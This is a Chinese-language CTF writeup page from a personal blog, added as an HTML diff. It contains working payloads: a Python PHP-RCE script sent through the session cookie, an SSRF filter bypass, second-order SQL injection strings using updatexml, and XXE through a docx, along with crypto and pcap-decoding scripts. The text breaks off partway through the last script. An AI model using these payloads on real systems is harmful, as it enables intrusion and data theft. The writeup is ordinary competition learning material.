@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Lethe">
+
+
+    <meta name="subtitle" content="Life is a struggle">
+
+
+    <meta name="description" content="Lethe's Blog">
+
+
+    <meta name="keywords" content="Lethe's Blog">
+
+
+<title>YLB-CTF-Writeup | Lethe&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/blog/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/blog/js/script.js"></script>
+    
+    <script src="/blog/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/blog/">Lethe&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/blog/archives">Posts</a>
+                
+                    <a class="menu-item" href="/blog/category">Categories</a>
+                
+                    <a class="menu-item" href="/blog/tag">Tags</a>
+                
+                    <a class="menu-item" href="/blog/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/blog/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/blog/archives">Posts</a>
+                
+                    <a class="menu-item" href="/blog/category">Categories</a>
+                
+                    <a class="menu-item" href="/blog/tag">Tags</a>
+                
+                    <a class="menu-item" href="/blog/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">YLB-CTF-Writeup</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">March 30, 2020&nbsp;&nbsp;17:32:22</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/blog/categories/Writeup/">Writeup</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="签到题-EasyRSA"><a href="#签到题-EasyRSA" class="headerlink" title="签到题 EasyRSA"></a>签到题 EasyRSA</h1><p>给了flag.en和rsa_private_key.pem私钥，直接用openssl解密，得到flag{We1c0meCtf3r_elab}<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/YLB-CTF-Writeup/20200327160717181.png" alt="在这里插入图片描述"></p>
+<h1 id="Web1-rce-nopar"><a href="#Web1-rce-nopar" class="headerlink" title="Web1 rce_nopar"></a>Web1 rce_nopar</h1><p>php的无参数rce，利用PHPSESSID，参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6316#toc-8">https://xz.aliyun.com/t/6316#toc-8</a></p>
+<p>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;system(&#x27;cat /flag.txt&#x27;);&quot;</span></span><br><span class="line">payload = <span class="built_in">str</span>(binascii.b2a_hex(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>))).strip(<span class="string">&quot;b&quot;</span>).strip(<span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">cookies=&#123;</span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>: payload</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">&#x27;http://124.193.74.212:7905?var=eval(hex2bin(session_id(session_start())));&#x27;</span>, cookies=cookies)</span><br><span class="line"><span class="built_in">print</span>(r.content.decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;ignore&quot;</span>))</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/YLB-CTF-Writeup/20200327161220829.png" alt="在这里插入图片描述"></p>
+<h1 id="Web2-SSRF"><a href="#Web2-SSRF" class="headerlink" title="Web2  SSRF"></a>Web2  SSRF</h1><p>把index.php两次base64编码传入，可以返回源码的base64，里面有提示：hal0flagi5here.php</p>
+<p>然后同样的方式读取该文件源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$argv</span>[<span class="number">1</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span>(<span class="variable">$argv</span>[<span class="number">1</span>],FILTER_VALIDATE_URL))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$r</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="variable">$r</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/happyctf\.com$/&#x27;</span>,<span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$url</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">		<span class="keyword">echo</span>(<span class="variable">$url</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;403 Forbidden&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后参考前一段时间“高校战役”的一道SSRF题目，使用如下payload绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=compress.zlib://file:@happyctf.com/../../../flag.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/YLB-CTF-Writeup/20200327162418535.png" alt="在这里插入图片描述"></p>
+<h1 id="Web3-SQLI"><a href="#Web3-SQLI" class="headerlink" title="Web3 SQLI"></a>Web3 SQLI</h1><p>几乎RCTF2015 easysql的原题，就改了个flag的位置，修改密码的地方存在二次注入，利用报错可以拿到数据。</p>
+<p>注册如下用户名:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lethe&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#</span><br></pre></td></tr></table></figure>
+<p>登陆后修改密码造成二次注入：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/YLB-CTF-Writeup/20200329155336514.png" alt="在这里插入图片描述"><br>然后同样的步骤得到列名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lethe&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),0x7e),1)#</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/YLB-CTF-Writeup/20200329155459916.png" alt="在这里插入图片描述"><br>得到flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lethe&quot;||updatexml(1,concat(0x7e,(select(group_concat(flag))from(flag)),0x7e),1)#</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/YLB-CTF-Writeup/20200329155644552.png" alt="在这里插入图片描述"></p>
+<h1 id="Web4-XXE"><a href="#Web4-XXE" class="headerlink" title="Web4 XXE"></a>Web4 XXE</h1><p>利用docx文件进行xxe，并且给了源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;submit&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$target_file</span> = <span class="title function_ invoke__">getcwd</span>().<span class="string">&quot;/upload/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$result</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;zip://&quot;</span>.<span class="variable">$target_file</span>.<span class="string">&quot;#docProps/core.xml&quot;</span>);</span><br><span class="line">            <span class="variable">$xml</span> = <span class="keyword">new</span> <span class="title class_">SimpleXMLElement</span>(<span class="variable">$result</span>, LIBXML_NOENT);</span><br><span class="line">            <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">registerXPathNamespace</span>(<span class="string">&quot;dc&quot;</span>, <span class="string">&quot;http://purl.org/dc/elements/1.1/&quot;</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="string">&#x27;//dc:title&#x27;</span>) <span class="keyword">as</span> <span class="variable">$title</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Title &#x27;&quot;</span>.<span class="variable">$title</span> . <span class="string">&quot;&#x27; has been added.&lt;br/&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$e</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;上传文件不是一个docx文档.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;上传失败.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到是从docProps目录下的core.xml读取xml，所以把docx文件解压后在core.xml里构造payload：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/YLB-CTF-Writeup/20200327170815267.png" alt="在这里插入图片描述"><br>然后在压缩回docx文件：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/YLB-CTF-Writeup/20200327170910380.png" alt="在这里插入图片描述"><br>上传该docx文件即可得到flag：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/YLB-CTF-Writeup/20200327170945365.png" alt="在这里插入图片描述"></p>
+<h1 id="Crypto2-RSABackDoor"><a href="#Crypto2-RSABackDoor" class="headerlink" title="Crypto2 RSABackDoor"></a>Crypto2 RSABackDoor</h1><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29457453/article/details/104918136">https://blog.csdn.net/qq_29457453/article/details/104918136</a></p>
+<p>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mapx</span>(<span class="params">x</span>):</span><br><span class="line">    x = (<span class="built_in">pow</span>(x, n-<span class="number">1</span>, n)+<span class="number">3</span>) % n</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">n = <span class="number">33774167600199691072470424898842928168570559940362770786060699320989546851695106466924163816843729828399984649770900793014896037884774039660562546937090412844276185560384964983508291174867808082182386566813393157054259464108858158903739578119760394228341564696225513954400995543629624209942565369972555679980359992955514826589781286738100616149226885302403505062415492679633217275379153421830105021673417544608398249866398042786421630495968810854036782025120509999022773806069591080190166920079688217334968528641747739241234353918892029263544388161160427668518991666960251381106788899451912317001247537576428186291689</span></span><br><span class="line"></span><br><span class="line">x1 = x2 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    x1 = mapx(x1)</span><br><span class="line">    x2 = mapx(mapx(x2))</span><br><span class="line">    p = gcd(x1-x2, n)</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">q = n // p</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">0xcd979917f492a04b86057a070923bd0b9eae2f1b81c75bf5d8a8fba9fc2084c00f2a697b409578abebdabcf337382d09145630f4040b0c5ff411171e577f563c3cfb4e22639e0755f76be976f7d7e68f05f87f78f178079354b4cec2a5cbea443439420be0b850d1fb696c5dea420594ad957ba96216cdb9d8f1f316adac64bc6eac5150b02540e5232d68bb69dc04363e2115d9120af2fd1c9ff2cd7588880333608110d687b22170540861a6e2308714d54cdee5cd5d28a16e37732e44c2208251513196a63d17bd4f7a69c526c118eebfbb77cf25e5e419fef6c59c0a17132b538d945dab3553751278ef415559f2d5afc30146d277555545c4d192c5e1b4</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br></pre></td></tr></table></figure>
+<p>运行得到flag：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/YLB-CTF-Writeup/2020032717243017.png" alt="在这里插入图片描述"></p>
+<h1 id="Misc3-Keyboard"><a href="#Misc3-Keyboard" class="headerlink" title="Misc3    Keyboard"></a>Misc3    Keyboard</h1><p>先执行下面命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r u.pcapng -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure>
+<p>网上找到下面脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span 